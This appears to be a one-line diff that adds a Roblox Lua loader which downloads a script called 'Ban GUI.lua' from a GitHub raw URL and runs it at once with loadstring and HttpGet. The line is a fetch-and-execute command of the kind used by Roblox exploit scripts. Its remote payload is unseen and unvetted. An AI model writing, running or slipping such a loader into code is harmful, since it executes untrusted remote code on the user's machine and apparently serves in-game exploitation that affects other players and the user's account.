@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/Tech-187/Lua-scripts/refs/heads/main/Ban%20GUI.lua"),true))()
